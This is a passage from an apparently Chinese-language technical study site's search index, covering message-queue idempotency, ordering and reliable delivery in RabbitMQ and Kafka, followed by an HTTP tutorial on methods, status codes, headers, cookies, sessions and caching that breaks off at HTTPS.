比如你拿个数据要写库，你先根据主键查一下，如果这数据都有了，你就别插入了，update 一下好吧。 比如你是写 Redis，那没问题了，反正每次都是 set，天然幂等性。 比如你不是上面两个场景，那做的稍微复杂一点，你需要让生产者发送每条数据的时候，里面加一个全局唯一的 id，类似订单 id 之类的东西，然后你这里消费到了之后，先根据这个 id 去比如 Redis 里查一下，之前消费过吗？如果没有消费过，你就处理，然后这个 id 写 Redis。如果消费过了，那你就别处理了，保证别重复处理相同的消息即可。 比如基于数据库的唯一键来保证重复数据不会重复插入多条。因为有唯一键约束了，重复数据插入只会报错，不会导致数据库中出现脏数据。  当然，如何保证 MQ 的消费是幂等性的，需要结合具体的业务来看。\n"},{"id":189,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/how-to-ensure-the-order-of-messages/","title":"how-to-ensure-the-order-of-messages","parent":"高并发","content":"面试题    如何保证消息的顺序性？\n面试官心理分析    其实这个也是用 MQ 的时候必问的话题，第一看看你了不了解顺序这个事儿？第二看看你有没有办法保证消息是有顺序的？这是生产系统中常见的问题。\n面试题剖析    我举个例子，我们以前做过一个 mysql binlog 同步的系统，压力还是非常大的，日同步数据要达到上亿，就是说数据从一个 mysql 库原封不动地同步到另一个 mysql 库里面去（mysql -\u0026gt; mysql）。常见的一点在于说比如大数据 team，就需要同步一个 mysql 库过来，对公司的业务系统的数据做各种复杂的操作。\n你在 mysql 里增删改一条数据，对应出来了增删改 3 条 binlog 日志，接着这三条 binlog 发送到 MQ 里面，再消费出来依次执行，起码得保证人家是按照顺序来的吧？不然本来是：增加、修改、删除；你愣是换了顺序给执行成删除、修改、增加，不全错了么。\n本来这个数据同步过来，应该最后这个数据被删除了；结果你搞错了这个顺序，最后这个数据保留下来了，数据同步就出错了。\n先看看顺序会错乱的俩场景：\n RabbitMQ：一个 queue，多个 consumer。比如，生产者向 RabbitMQ 里发送了三条数据，顺序依次是 data1/data2/data3，压入的是 RabbitMQ 的一个内存队列。有三个消费者分别从 MQ 中消费这三条数据中的一条，结果消费者 2 先执行完操作，把 data2 存入数据库，然后是 data1/data3。这不明显乱了。   Kafka：比如说我们建了一个 topic，有三个 partition。生产者在写的时候，其实可以指定一个 key，比如说我们指定了某个订单 id 作为 key，那么这个订单相关的数据，一定会被分发到同一个 partition 中去，而且这个 partition 中的数据一定是有顺序的。\n消费者从 partition 中取出来数据的时候，也一定是有顺序的。到这里，顺序还是 ok 的，没有错乱。接着，我们在消费者里可能会搞多个线程来并发处理消息。因为如果消费者是单线程消费处理，而处理比较耗时的话，比如处理一条消息耗时几十 ms，那么 1 秒钟只能处理几十条消息，这吞吐量太低了。而多个线程并发跑的话，顺序可能就乱掉了。  解决方案    RabbitMQ    拆分多个 queue，每个 queue 一个 consumer，就是多一些 queue 而已，确实是麻烦点；或者就一个 queue 但是对应一个 consumer，然后这个 consumer 内部用内存队列做排队，然后分发给底层不同的 worker 来处理。\nKafka     一个 topic，一个 partition，一个 consumer，内部单线程消费，单线程吞吐量太低，一般不会用这个。 写 N 个内存 queue，具有相同 key 的数据都到同一个内存 queue；然后对于 N 个线程，每个线程分别消费一个内存 queue 即可，这样就能保证顺序性。  "},{"id":190,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/how-to-ensure-the-reliable-transmission-of-messages/","title":"how-to-ensure-the-reliable-transmission-of-messages","parent":"高并发","content":"面试题    如何保证消息的可靠性传输？或者说，如何处理消息丢失的问题？\n面试官心理分析    这个是肯定的，用 MQ 有个基本原则，就是数据不能多一条，也不能少一条，不能多，就是前面说的重复消费和幂等性问题。不能少，就是说这数据别搞丢了。那这个问题你必须得考虑一下。\n如果说你这个是用 MQ 来传递非常核心的消息，比如说计费、扣费的一些消息，那必须确保这个 MQ 传递过程中绝对不会把计费消息给弄丢。\n面试题剖析    数据的丢失问题，可能出现在生产者、MQ、消费者中，咱们从 RabbitMQ 和 Kafka 分别来分析一下吧。\nRabbitMQ    生产者弄丢了数据    生产者将数据发送到 RabbitMQ 的时候，可能数据就在半路给搞丢了，因为网络问题啥的，都有可能。\n此时可以选择用 RabbitMQ 提供的事务功能，就是生产者发送数据之前开启 RabbitMQ 事务 channel.txSelect ，然后发送消息，如果消息没有成功被 RabbitMQ 接收到，那么生产者会收到异常报错，此时就可以回滚事务 channel.txRollback ，然后重试发送消息；如果收到了消息，那么可以提交事务 channel.txCommit 。\n// 开启事务 channel.txSelect try { // 这里发送消息 } catch (Exception e) { channel.txRollback // 这里再次重发这条消息 } // 提交事务 channel.txCommit 但是问题是，RabbitMQ 事务机制（同步）一搞，基本上吞吐量会下来，因为太耗性能。\n所以一般来说，如果你要确保说写 RabbitMQ 的消息别丢，可以开启 confirm 模式，在生产者那里设置开启 confirm 模式之后，你每次写的消息都会分配一个唯一的 id，然后如果写入了 RabbitMQ 中，RabbitMQ 会给你回传一个 ack 消息，告诉你说这个消息 ok 了。如果 RabbitMQ 没能处理这个消息，会回调你的一个 nack 接口，告诉你这个消息接收失败，你可以重试。而且你可以结合这个机制自己在内存里维护每个消息 id 的状态，如果超过一定时间还没接收到这个消息的回调，那么你可以重发。\n事务机制和 confirm 机制最大的不同在于，事务机制是同步的，你提交一个事务之后会阻塞在那儿，但是 confirm 机制是异步的，你发送个消息之后就可以发送下一个消息，然后那个消息 RabbitMQ 接收了之后会异步回调你的一个接口通知你这个消息接收到了。\n所以一般在生产者这块避免数据丢失，都是用 confirm 机制的。\nRabbitMQ 弄丢了数据    就是 RabbitMQ 自己弄丢了数据，这个你必须开启 RabbitMQ 的持久化，就是消息写入之后会持久化到磁盘，哪怕是 RabbitMQ 自己挂了，恢复之后会自动读取之前存储的数据，一般数据不会丢。除非极其罕见的是，RabbitMQ 还没持久化，自己就挂了，可能导致少量数据丢失，但是这个概率较小。\n设置持久化有两个步骤：\n 创建 queue 的时候将其设置为持久化\n  这样就可以保证 RabbitMQ 持久化 queue 的元数据，但是它是不会持久化 queue 里的数据的。\n 第二个是发送消息的时候将消息的 deliveryMode 设置为 2\n  就是将消息设置为持久化的，此时 RabbitMQ 就会将消息持久化到磁盘上去。\n必须要同时设置这两个持久化才行，RabbitMQ 哪怕是挂了，再次重启，也会从磁盘上重启恢复 queue，恢复这个 queue 里的数据。\n注意，哪怕是你给 RabbitMQ 开启了持久化机制，也有一种可能，就是这个消息写到了 RabbitMQ 中，但是还没来得及持久化到磁盘上，结果不巧，此时 RabbitMQ 挂了，就会导致内存里的一点点数据丢失。\n所以，持久化可以跟生产者那边的 confirm 机制配合起来，只有消息被持久化到磁盘之后，才会通知生产者 ack 了，所以哪怕是在持久化到磁盘之前，RabbitMQ 挂了，数据丢了，生产者收不到 ack ，你也是可以自己重发的。\n消费端弄丢了数据    RabbitMQ 如果丢失了数据，主要是因为你消费的时候，刚消费到，还没处理，结果进程挂了，比如重启了，那么就尴尬了，RabbitMQ 认为你都消费了，这数据就丢了。\n这个时候得用 RabbitMQ 提供的 ack 机制，简单来说，就是你必须关闭 RabbitMQ 的自动 ack ，可以通过一个 api 来调用就行，然后每次你自己代码里确保处理完的时候，再在程序里 ack 一把。这样的话，如果你还没处理完，不就没有 ack 了？那 RabbitMQ 就认为你还没处理完，这个时候 RabbitMQ 会把这个消费分配给别的 consumer 去处理，消息是不会丢的。\nKafka    消费端弄丢了数据    唯一可能导致消费者弄丢数据的情况，就是说，你消费到了这个消息，然后消费者那边自动提交了 offset，让 Kafka 以为你已经消费好了这个消息，但其实你才刚准备处理这个消息，你还没处理，你自己就挂了，此时这条消息就丢咯。\n这不是跟 RabbitMQ 差不多吗，大家都知道 Kafka 会自动提交 offset，那么只要关闭自动提交 offset，在处理完之后自己手动提交 offset，就可以保证数据不会丢。但是此时确实还是可能会有重复消费，比如你刚处理完，还没提交 offset，结果自己挂了，此时肯定会重复消费一次，自己保证幂等性就好了。\n生产环境碰到的一个问题，就是说我们的 Kafka 消费者消费到了数据之后是写到一个内存的 queue 里先缓冲一下，结果有的时候，你刚把消息写入内存 queue，然后消费者会自动提交 offset。然后此时我们重启了系统，就会导致内存 queue 里还没来得及处理的数据就丢失了。\nKafka 弄丢了数据    这块比较常见的一个场景，就是 Kafka 某个 broker 宕机，然后重新选举 partition 的 leader。大家想想，要是此时其他的 follower 刚好还有些数据没有同步，结果此时 leader 挂了，然后选举某个 follower 成 leader 之后，不就少了一些数据？这就丢了一些数据啊。\n生产环境也遇到过，我们也是，之前 Kafka 的 leader 机器宕机了，将 follower 切换为 leader 之后，就会发现说这个数据就丢了。\n所以此时一般是要求起码设置如下 4 个参数：\n 给 topic 设置 replication.factor 参数：这个值必须大于 1，要求每个 partition 必须有至少 2 个副本。 在 Kafka 服务端设置 min.insync.replicas 参数：这个值必须大于 1，这个是要求一个 leader 至少感知到有至少一个 follower 还跟自己保持联系，没掉队，这样才能确保 leader 挂了还有一个 follower 吧。 在 producer 端设置 acks=all ：这个是要求每条数据，必须是写入所有 replica 之后，才能认为是写成功了。 在 producer 端设置 retries=MAX （很大很大很大的一个值，无限次重试的意思）：这个是要求一旦写入失败，就无限重试，卡在这里了。  我们生产环境就是按照上述要求配置的，这样配置之后，至少在 Kafka broker 端就可以保证在 leader 所在 broker 发生故障，进行 leader 切换时，数据不会丢失。\n生产者会不会弄丢数据？    如果按照上述的思路设置了 acks=all ，一定不会丢，要求是，你的 leader 接收到消息，所有的 follower 都同步到了消息之后，才认为本次写成功了。如果没满足这个条件，生产者会自动不断的重试，重试无限次。\n"},{"id":191,"href":"/%E7%AC%94%E8%AE%B0/HTTP/","title":"HTTP","parent":"笔记","content":"HTTP     HTTP  一 、基础概念  请求和响应报文 URL   二、HTTP 方法  GET HEAD POST PUT PATCH DELETE OPTIONS CONNECT TRACE   三、HTTP 状态码  1XX 信息 2XX 成功 3XX 重定向 4XX 客户端错误 5XX 服务器错误   四、HTTP 首部  通用首部字段 请求首部字段 响应首部字段 实体首部字段   五、具体应用  连接管理 Cookie 缓存 内容协商 内容编码 范围请求 分块传输编码 多部分对象集合 虚拟主机 通信数据转发   六、HTTPS  加密 认证 完整性保护 HTTPS 的缺点   七、HTTP/2.0  HTTP/1.x 缺陷 二进制分帧层 服务端推送 首部压缩   八、HTTP/1.1 新特性 九、GET 和 POST 比较  作用 参数 安全 幂等性 可缓存 XMLHttpRequest   参考资料    一 、基础概念    请求和响应报文    客户端发送一个请求报文给服务器，服务器根据请求报文中的信息进行处理，并将处理结果放入响应报文中返回给客户端。\n请求报文结构：\n 第一行是包含了请求方法、URL、协议版本； 接下来的多行都是请求首部 Header，每个首部都有一个首部名称，以及对应的值。 一个空行用来分隔首部和内容主体 Body 最后是请求的内容主体  GET http://www.example.com/ HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cache-Control: max-age=0 Host: www.example.com If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT If-None-Match: \u0026quot;3147526947+gzip\u0026quot; Proxy-Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 xxx param1=1\u0026amp;param2=2 响应报文结构：\n 第一行包含协议版本、状态码以及描述，最常见的是 200 OK 表示请求成功了 接下来多行也是首部内容 一个空行分隔首部和内容主体 最后是响应的内容主体  HTTP/1.1 200 OK Age: 529651 Cache-Control: max-age=604800 Connection: keep-alive Content-Encoding: gzip Content-Length: 648 Content-Type: text/html; charset=UTF-8 Date: Mon, 02 Nov 2020 17:53:39 GMT Etag: \u0026quot;3147526947+ident+gzip\u0026quot; Expires: Mon, 09 Nov 2020 17:53:39 GMT Keep-Alive: timeout=4 Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT Proxy-Connection: keep-alive Server: ECS (sjc/16DF) Vary: Accept-Encoding X-Cache: HIT \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Example Domain\u0026lt;/title\u0026gt; // 省略... \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; URL    HTTP 使用 URL（ U niform Resource Locator，统一资源定位符）来定位资源，它是 URI（Uniform Resource Identifier，统一资源标识符）的子集，URL 在 URI 的基础上增加了定位能力。URI 除了包含 URL，还包含 URN（Uniform Resource Name，统一资源名称），它只是用来定义一个资源的名称，并不具备定位该资源的能力。例如 urn:isbn:0451450523 用来定义一个书籍名称，但是却没有表示怎么找到这本书。\n\n wikipedia：统一资源标志符 wikipedia: URL rfc2616：3.2.2 http URL What is the difference between a URI, a URL and a URN?  二、HTTP 方法    客户端发送的 请求报文 第一行为请求行，包含了方法字段。\nGET     获取资源\n 当前网络请求中，绝大部分使用的是 GET 方法。\nHEAD     获取报文首部\n 和 GET 方法类似，但是不返回报文实体主体部分。\n主要用于确认 URL 的有效性以及资源更新的日期时间等。\nPOST     传输实体主体\n POST 主要用来传输数据，而 GET 主要用来获取资源。\n更多 POST 与 GET 的比较请见第九章。\nPUT     上传文件\n 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。\nPUT /new.html HTTP/1.1 Host: example.com Content-type: text/html Content-length: 16 \u0026lt;p\u0026gt;New File\u0026lt;/p\u0026gt; PATCH     对资源进行部分修改\n PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。\nPATCH /file.txt HTTP/1.1 Host: www.example.com Content-Type: application/example If-Match: \u0026#34;e0023aa4e\u0026#34; Content-Length: 100 [description of changes] DELETE     删除文件\n 与 PUT 功能相反，并且同样不带验证机制。\nDELETE /file.html HTTP/1.1 OPTIONS     查询支持的方法\n 查询指定的 URL 能够支持的方法。\n会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。\nCONNECT     要求在与代理服务器通信时建立隧道\n 使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。\nCONNECT www.example.com:443 HTTP/1.1 \nTRACE     追踪路径\n 服务器会将通信路径返回给客户端。\n发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。\n通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。\n rfc2616：9 Method Definitions  三、HTTP 状态码    服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。\n   状态码 类别 含义     1XX Informational（信息性状态码） 接收的请求正在处理   2XX Success（成功状态码） 请求正常处理完毕   3XX Redirection（重定向状态码） 需要进行附加操作以完成请求   4XX Client Error（客户端错误状态码） 服务器无法处理请求   5XX Server Error（服务器错误状态码） 服务器处理请求出错    1XX 信息     100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。  2XX 成功      200 OK\n  204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。\n  206 Partial Content ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。\n  3XX 重定向      301 Moved Permanently ：永久性重定向\n  302 Found ：临时性重定向\n  303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。\n  注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。\n  304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。\n  307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。\n  4XX 客户端错误      400 Bad Request ：请求报文中存在语法错误。\n  401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。\n  403 Forbidden ：请求被拒绝。\n  404 Not Found\n  5XX 服务器错误      500 Internal Server Error ：服务器正在执行请求时发生错误。\n  503 Service Unavailable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。\n  四、HTTP 首部    有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。\n各种首部字段及其含义如下（不需要全记，仅供查阅）：\n通用首部字段       首部字段名 说明     Cache-Control 控制缓存的行为   Connection 控制不再转发给代理的首部字段、管理持久连接   Date 创建报文的日期时间   Pragma 报文指令   Trailer 报文末端的首部一览   Transfer-Encoding 指定报文主体的传输编码方式   Upgrade 升级为其他协议   Via 代理服务器的相关信息   Warning 错误通知    请求首部字段       首部字段名 说明     Accept 用户代理可处理的媒体类型   Accept-Charset 优先的字符集   Accept-Encoding 优先的内容编码   Accept-Language 优先的语言（自然语言）   Authorization Web 认证信息   Expect 期待服务器的特定行为   From 用户的电子邮箱地址   Host 请求资源所在服务器   If-Match 比较实体标记（ETag）   If-Modified-Since 比较资源的更新时间   If-None-Match 比较实体标记（与 If-Match 相反）   If-Range 资源未更新时发送实体 Byte 的范围请求   If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反）   Max-Forwards 最大传输逐跳数   Proxy-Authorization 代理服务器要求客户端的认证信息   Range 实体的字节范围请求   Referer 对请求中 URI 的原始获取方   TE 传输编码的优先级   User-Agent HTTP 客户端程序的信息    响应首部字段       首部字段名 说明     Accept-Ranges 是否接受字节范围请求   Age 推算资源创建经过时间   ETag 资源的匹配信息   Location 令客户端重定向至指定 URI   Proxy-Authenticate 代理服务器对客户端的认证信息   Retry-After 对再次发起请求的时机要求   Server HTTP 服务器的安装信息   Vary 代理服务器缓存的管理信息   WWW-Authenticate 服务器对客户端的认证信息    实体首部字段       首部字段名 说明     Allow 资源可支持的 HTTP 方法   Content-Encoding 实体主体适用的编码方式   Content-Language 实体主体的自然语言   Content-Length 实体主体的大小   Content-Location 替代对应资源的 URI   Content-MD5 实体主体的报文摘要   Content-Range 实体主体的位置范围   Content-Type 实体主体的媒体类型   Expires 实体主体过期的日期时间   Last-Modified 资源的最后修改日期时间    五、具体应用    连接管理    \n1. 短连接与长连接    当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。\n长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。\n 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close； 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 Connection : Keep-Alive。  2. 流水线    默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。\n流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。\nCookie    HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。\nCookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。\nCookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。\n1. 用途     会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等）  2. 创建过程    服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。\nHTTP/1.0 200 OK Content-type: text/html Set-Cookie: yummy_cookie=choco Set-Cookie: tasty_cookie=strawberry [page content] 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。\nGET /sample_page.html HTTP/1.1 Host: www.example.org Cookie: yummy_cookie=choco; tasty_cookie=strawberry 3. 分类     会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 4. 作用域    Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。\nPath 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (\u0026quot;/\u0026quot;) 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：\n /docs /docs/Web/ /docs/Web/HTTP  5. JavaScript    浏览器通过 document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。\ndocument.cookie = \u0026#34;yummy_cookie=choco\u0026#34;; document.cookie = \u0026#34;tasty_cookie=strawberry\u0026#34;; console.log(document.cookie); 6. HttpOnly    标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 document.cookie API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 7. Secure    标记为 Secure 的 Cookie 只能通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。\n8. Session    除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。\nSession 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。\n使用 Session 维护用户登录状态的过程如下：\n 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中； 服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID； 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中； 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。  应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。\n9. 浏览器禁用 Cookie    此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，将 Session ID 作为 URL 的参数进行传递。\n10. Cookie 与 Session 选择     Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在考虑数据复杂性时首选 Session； Cookie 存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密； 对于大型网站，如果用户所有的信息都存储在 Session 中，那么开销是非常大的，因此不建议将所有的用户信息都存储到 Session 中。  缓存    1. 优点     缓解服务器压力； 降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。  2. 实现方法     让代理服务器进行缓存； 让客户端浏览器进行缓存。  3. Cache-Control    HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。\n3.1 禁止进行缓存\nno-store 指令规定不能对请求或响应的任何一部分进行缓存。\nCache-Control: no-store 3.2 强制确认缓存\nno-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。\nCache-Control: no-cache 3.3 私有缓存和公共缓存\nprivate 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。\nCache-Control: private public 指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。\nCache-Control: public 3.4 缓存过期机制\nmax-age 指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。\nmax-age 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。\nCache-Control: max-age=31536000 Expires 首部字段也可以用于告知缓存服务器该资源什么时候会过期。\nExpires: Wed, 04 Jul 2012 08:26:05 GMT  在 HTTP/1.1 中，会优先处理 max-age 指令； 在 HTTP/1.0 中，max-age 指令会被忽略掉。  4. 缓存验证    需要先了解 ETag 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 http://www.google.com/ 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一标识。\nETag: \u0026#34;82e22293907ce725faf67773957acd12\u0026#34; 可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。\nIf-None-Match: \u0026#34;82e22293907ce725faf67773957acd12\u0026#34; Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 304 Not Modified 响应报文。\nLast-Modified: Wed, 21 Oct 2015 07:28:00 GMT If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT 内容协商    通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。\n1. 类型    1.1 服务端驱动型\n客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。\n它存在以下问题：\n 服务器很难知道客户端浏览器的全部信息； 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）； 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。  1.2 代理驱动型\n服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。\n2. Vary    Vary: Accept-Language 在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。\n例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 Vary: Accept-Language 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。\n内容编码    内容编码将实体主体进行压缩，从而减少传输的数据量。\n常用的内容编码有：gzip、compress、deflate、identity。\n浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 Content-Encoding。\n范围请求    如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。\n1. Range    在请求报文中添加 Range 首部字段指定请求的范围。\nGET /z4d4kWk.jpg HTTP/1.1 Host: i.imgur.com Range: bytes=0-1023 请求成功的话服务器返回的响应包含 206 Partial Content 状态码。\nHTTP/1.1 206 Partial Content Content-Range: bytes 0-1023/146515 Content-Length: 1024 ... (binary content) 2. Accept-Ranges    响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。\nAccept-Ranges: bytes 3. 响应状态码     在请求成功的情况下，服务器会返回 206 Partial Content 状态码。 在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。 在不支持范围请求的情况下，服务器会返回 200 OK 状态码。  分块传输编码    Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。\n多部分对象集合    一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。\n例如，上传多个表单时可以使用如下方式：\nContent-Type: multipart/form-data; boundary=AaB03x --AaB03x Content-Disposition: form-data; name=\u0026#34;submit-name\u0026#34; Larry --AaB03x Content-Disposition: form-data; name=\u0026#34;files\u0026#34;; filename=\u0026#34;file1.txt\u0026#34; Content-Type: text/plain ... contents of file1.txt ... --AaB03x-- 虚拟主机    HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。\n通信数据转发    1. 代理    代理服务器接受客户端的请求，并且转发给其它服务器。\n使用代理的主要目的是：\n 缓存 负载均衡 网络访问控制 访问日志记录  代理服务器分为正向代理和反向代理两种：\n 用户察觉得到正向代理的存在。  \n 而反向代理一般位于内部网络中，用户察觉不到。  \n2. 网关    与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。\n3. 隧道    使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。\n六、HTTPS    HTTP 有以下安全性问题：\n 使用明文进行通信，内容可能会被窃听； 